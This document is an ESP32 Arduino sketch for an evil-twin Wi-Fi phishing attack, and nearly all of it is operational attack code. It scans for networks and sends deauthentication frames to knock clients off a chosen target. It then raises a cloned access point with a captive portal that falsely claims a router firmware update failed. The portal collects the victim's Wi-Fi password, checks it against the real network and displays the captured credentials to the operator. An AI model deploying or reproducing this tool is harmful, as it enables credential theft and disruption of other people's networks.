#include <WiFi.h>
#include <WiFiClient.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <HTTPClient.h>
#include <esp_wifi.h>

typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";

// Default main strings
#define SUBTITLE "ACCESS POINT RESCUE MODE"
#define TITLE "<warning class='text-4xl text-yellow-500 font-bold'>&#9888;</warning> Firmware Update Failed"
#define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br>To revert the old firmware and manually update later, please verify your password."

String header(String t) {
  // We're using Tailwind CSS classes for a modern, responsive design.
  String CSS = "body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background-color: #f7f9fb; color: #333; margin: 0; padding: 0; }"
               ".container { max-width: 600px; margin: 0 auto; padding: 1.5rem; }"
               ".card { background-color: #ffffff; border-radius: 1rem; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); padding: 2rem; margin-top: 2rem; }"
               "nav { background-color: #2b6cb0; color: #ffffff; padding: 1.5rem; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }"
               "nav b { display: block; font-size: 1.5rem; margin-bottom: 0.5rem; }"
               "h1 { margin-top: 0; color: #2d3748; text-align: center; font-size: 1.8rem; }"
               "p { text-align: center; line-height: 1.6; margin-bottom: 1.5rem; color: #4a5568; }"
               "label { display: block; margin-bottom: 0.5rem; font-weight: 600; color: #2d3748; }"
               "input[type=password] { width: 100%; padding: 0.75rem; border: 1px solid #e2e8f0; border-radius: 0.5rem; margin-bottom: 1rem; box-sizing: border-box; }"
               "input[type=submit] { width: 100%; padding: 0.75rem; background-color: #3182ce; color: #fff; border: none; border-radius: 0.5rem; cursor: pointer; font-size: 1rem; font-weight: 600; transition: background-color 0.2s; }"
               "input[type=submit]:hover { background-color: #2c5282; }"
               ".footer { text-align: center; margin-top: 2rem; font-size: 0.875rem; color: #a0aec0; }"
               ".alert-box { padding: 1rem; margin-top: 1rem; border-radius: 0.5rem; text-align: center; font-weight: 600; }"
               ".alert-error { background-color: #fff5f5; color: #c53030; border: 1px solid #fed7d7; }"
               ".alert-success { background-color: #f0fff4; color: #2f855a; border: 1px solid #c6f6d5; }"
               ".grid-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1rem; margin-top: 2rem; }"
               ".grid-card { background-color: #ffffff; border-radius: 0.75rem; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); padding: 1.5rem; display: flex; flex-direction: column; justify-content: space-between; }"
               ".grid-card h3 { margin: 0 0 0.5rem 0; font-size: 1.25rem; color: #2d3748; font-weight: 600; }"
               ".grid-card p { margin: 0; font-size: 0.875rem; color: #718096; }"
               ".grid-card .info { margin-bottom: 1rem; }"
               ".grid-card .button-wrapper { margin-top: auto; }"
               "button { padding: 0.5rem 1rem; border-radius: 0.5rem; font-weight: 600; cursor: pointer; transition: background-color 0.2s; border: none; }"
               "button.select-btn {background-color: #48bb78; color: white; border: none; }"
               "button.select-btn:hover { background-color: #38a169; }"
               "button.deauth-btn-start { background-color: #e53e3e; color: white; border: none; }"
               "button.deauth-btn-stop { background-color: #718096; color: white; border: none; }"
               "button.hotspot-btn-start { background-color: #3182ce; color: white; border: none; }"
               "button.hotspot-btn-stop { background-color: #718096; color: white; border: none; }"
               "button:disabled { background-color: #e2e8f0; cursor: not-allowed; }"
               "button.selected-btn { background-color: #48bb78; color: white; border: none; }"
               ".button-group { display: flex; gap: 1rem; margin-bottom: 2rem; }"
               ".password-form { margin-top: 2rem; }"
               ;
  String a = String(_selectedNetwork.ssid);
  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style>"
             "<meta charset=\"UTF-8\"></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav>"
             "<div class='container'>"
             "<div class='card'>";
  return h;
}

String footer() {
  return "</div>" // end card
         "<div class='footer'><a>&#169; All rights reserved.</a></div>"
         "</div></body></html>";
}

String index() {
  return header(TITLE) +
         "<p class='mb-4'>" + BODY + "</p>" +
         "<div class='password-form'><form action='/' method=post>" +
         "<label for='password'>WiFi password:</label>" +
         "<input type=password id='password' name='password' minlength='8'></input>" +
         "<input type=submit value='Continue'></form></div>" +
         footer();
}

void setup() {
  Serial.begin(115200);
  
  // Set WiFi mode
  WiFi.mode(WIFI_MODE_APSTA);
  
  // Enable promiscuous mode
  esp_wifi_set_promiscuous(true);
  
  // Configure and start soft AP
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("PhiSiFi_OnFire", "244466666x");
  
  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    }
    webServer.send(200, "text/html", "<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>body{background-color:#f7f9fb;font-family:sans-serif;text-align:center;padding:2rem;}.card{background-color:white;border-radius:1rem;box-shadow:0 4px 6px rgba(0,0,0,0.1);padding:2rem;max-width:400px;margin:2rem auto;}.error-icon{font-size:3rem;color:#e53e3e;}.error-text{font-size:1.5rem;color:#c53030;font-weight:bold;margin-top:1rem;}.info-text{margin-top:0.5rem;color:#4a5568;}</style><script>setTimeout(function(){window.location.href='/';},4000);</script></head><body><div class='card'><div class='error-icon'>&#8855;</div><div class='error-text'>Wrong Password</div><p class='info-text'>Please, try again.</p></div></body></html>");
    Serial.println("Wrong password tried!");
  } else {
    _correct = "SSID: " + _selectedNetwork.ssid + "<br> PASS: " + _tryPassword;
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect(true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("PhiSiFi_OnFire", "244466666x");
    dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    Serial.println("Good password was entered !");
    Serial.println(_correct);
  }
}

String _tempHTML = "<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                      "<style>"
                      "body{font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background-color: #f7f9fb; color: #333; margin: 0; padding: 0;}"
                      ".container { max-width: 800px; margin: 0 auto; padding: 1.5rem; }"
                      ".card { background-color: #ffffff; border-radius: 1rem; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); padding: 2rem; margin-top: 2rem; }"
                      "nav { background-color: #2b6cb0; color: #ffffff; padding: 1.5rem; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }"
                      "nav b { display: block; font-size: 1.5rem; margin-bottom: 0.5rem; }"
                      "h1 { margin-top: 0; color: #2d3748; text-align: center; font-size: 1.8rem; }"
                      "p { text-align: center; line-height: 1.6; margin-bottom: 1.5rem; color: #4a5568; }"
                      ".grid-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1rem; margin-top: 2rem; }"
                      ".grid-card { background-color: #ffffff; border-radius: 0.75rem; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); padding: 1.5rem; display: flex; flex-direction: column; justify-content: space-between; }"
                      ".grid-card h3 { margin: 0 0 0.5rem 0; font-size: 1.25rem; color: #2d3748; font-weight: 600; }"
                      ".grid-card p { margin: 0; font-size: 0.875rem; color: #718096; }"
                      ".grid-card .info { margin-bottom: 1rem; }"
                      ".grid-card .button-wrapper { margin-top: auto; }"
                      "button { padding: 0.5rem 1rem; border-radius: 0.5rem; font-weight: 600; cursor: pointer; transition: background-color 0.2s; border: none; }"
                      "button.select-btn { background-color: #48bb78; color: white; }"
                      "button.select-btn:hover { background-color: #38a169; }"
                      "button.deauth-btn-start { background-color: #e53e3e; color: white; }"
                      "button.deauth-btn-stop { background-color: #718096; color: white; }"
                      "button.hotspot-btn-start { background-color: #3182ce; color: white; }"
                      "button.hotspot-btn-stop { background-color: #718096; color: white; }"
                      "button:disabled { background-color: #e2e8f0; cursor: not-allowed; }"
                      "button.selected-btn { background-color: #48bb78; color: white; }"
                      ".button-group { display: flex; gap: 1rem; margin-bottom: 2rem; }"
                      ".alert-success { background-color: #f0fff4; color: #2f855a; border: 1px solid #c6f6d5; padding: 1rem; border-radius: 0.5rem; text-align: center; font-weight: 600; }"
                      "</style>"
                      "</head><body><nav><b>PhiSiFi_OnFire</b> ADMIN PANEL</nav><div class='container'><div class='card'>"
                      "<h1>Available Networks</h1>"
                      "<div class='button-group'>"
                      "<form method='post' action='/?deauth={deauth}'>"
                      "<button class='deauth-btn-{deauth}' {disabled}>{deauth_button}</button></form>"
                      "<form method='post' action='/?hotspot={hotspot}'>"
                      "<button class='hotspot-btn-{hotspot}' {disabled}>{hotspot_button}</button></form>"
                      "</div>"
                      "<div class='grid-container'>";

void handleIndex() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("PhiSiFi_OnFire", "244466666x");
      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if (_networks[i].ssid == "") {
        break;
      }
      _html += "<div class='grid-card'>"
               "<h3 style='text-align:center;'>" + _networks[i].ssid + "</h3>"
               "<div class='info'>"
               "<p><strong>BSSID:</strong> " + bytesToStr(_networks[i].bssid, 6) + "</p>"
               "<p><strong>Channel:</strong> " + String(_networks[i].ch) + "</p>"
               "</div>"
               "<div class='button-wrapper'>"
               "<form style='text-align:center;' method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button class='selected-btn' disabled>Selected</button></form>";
      } else {
        _html += "<button class='select-btn'>Select</button></form>";
      }
      _html += "</div></div>";
    }

    _html.replace("{deauth_button}", deauthing_active ? "Stop Deauthing" : "Start Deauthing");
    _html.replace("{deauth}", deauthing_active ? "stop" : "start");
    _html.replace("deauth-btn-start", deauthing_active ? "deauth-btn-stop" : "deauth-btn-start");

    _html.replace("{hotspot_button}", hotspot_active ? "Stop EvilTwin" : "Start EvilTwin");
    _html.replace("{hotspot}", hotspot_active ? "stop" : "start");
    _html.replace("hotspot-btn-start", hotspot_active ? "hotspot-btn-stop" : "hotspot-btn-start");

    _html.replace("{disabled}", _selectedNetwork.ssid == "" ? " disabled" : "");

    _html += "</div>"; // close grid-container

    if (_correct != "") {
      _html += "<div class='alert-success mt-4' style='margin-top:20px'><h3>Mission Successful</h3><p>" + _correct + "</p></div>";
    }

    _html += "</div></div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      if (webServer.arg("deauth") == "start") {
        deauthing_active = false;
      }
      delay(1000);
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str());
      webServer.send(200, "text/html", "<!DOCTYPE html><html><head><style>body{background-color:#f7f9fb;font-family:sans-serif;text-align:center;padding:2rem;}.card{background-color:white;border-radius:1rem;box-shadow:0 4px 6px rgba(0,0,0,0.1);padding:2rem;max-width:400px;margin:2rem auto;}.spinner{border:6px solid #e2e8f0;border-top:6px solid #3182ce;border-radius:50%;width:50px;height:50px;animation:spin 2s linear infinite;margin:0 auto;margin-bottom:1rem;}@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}.text-center{text-align:center;font-size:1.5rem;font-weight:bold;color:#4a5568;}.progress-bar{height:10px;background-color:#e2e8f0;border-radius:5px;overflow:hidden;margin-top:1rem;}.progress-fill{height:100%;background-color:#3182ce;width:10%;animation:progress 15s forwards;}@keyframes progress{0%{width:10%;}100%{width:100%;}}</style><script>setTimeout(function(){window.location.href='/result';},15000);</script></head><body><div class='card'><div class='spinner'></div><div class='text-center'>Verifying integrity, please wait...</div><div class='progress-bar'><div class='progress-fill'></div></div></div></body></html>");
      if (webServer.arg("deauth") == "start") {
        deauthing_active = true;
      }
    } else {
      webServer.send(200, "text/html", index());
    }
  }
}

void handleAdmin() {
  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("PhiSiFi_OnFire", "244466666x");
      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if (_networks[i].ssid == "") {
      break;
    }
    _html += "<div class='grid-card'>"
             "<h3 style='text-align:center;'>" + _networks[i].ssid + "</h3>"
             "<div class='info'>"
             "<p><strong>BSSID:</strong> " + bytesToStr(_networks[i].bssid, 6) + "</p>"
             "<p><strong>Channel:</strong> " + String(_networks[i].ch) + "</p>"
             "</div>"
             "<div class='button-wrapper'>"
             "<form style='text-align:center;' method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

    if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button class='selected-btn' disabled>Selected</button></form>";
    } else {
      _html += "<button class='select-btn'>Select</button></form>";
    }
    _html += "</div></div>";
  }
  _html += "</div>"; // close grid-container

  _html.replace("{deauth_button}", deauthing_active ? "Stop Deauthing" : "Start Deauthing");
  _html.replace("{deauth}", deauthing_active ? "stop" : "start");
  _html.replace("deauth-btn-start", deauthing_active ? "deauth-btn-stop" : "deauth-btn-start");

  _html.replace("{hotspot_button}", hotspot_active ? "Stop EvilTwin" : "Start EvilTwin");
  _html.replace("{hotspot}", hotspot_active ? "stop" : "start");
  _html.replace("hotspot-btn-start", hotspot_active ? "hotspot-btn-stop" : "hotspot-btn-start");

  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "<div class='alert-success mt-4' style='margin-top:20px'><h3>Mission Successful</h3><p>" + _correct + "</p></div>";
  }

  _html += "</div></div></body></html>";
  webServer.send(200, "text/html", _html);
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

// ESP32 specific variables for deauth
wifi_promiscuous_pkt_t *deauth_packet;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {
    // Set WiFi channel
    esp_wifi_set_channel(_selectedNetwork.ch, WIFI_SECOND_CHAN_NONE);

    // Create deauth packet
    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    
    // Send deauth packet
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
    Serial.println(result == ESP_OK ? "Deauth packet sent" : "Failed to send deauth packet");
    
    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}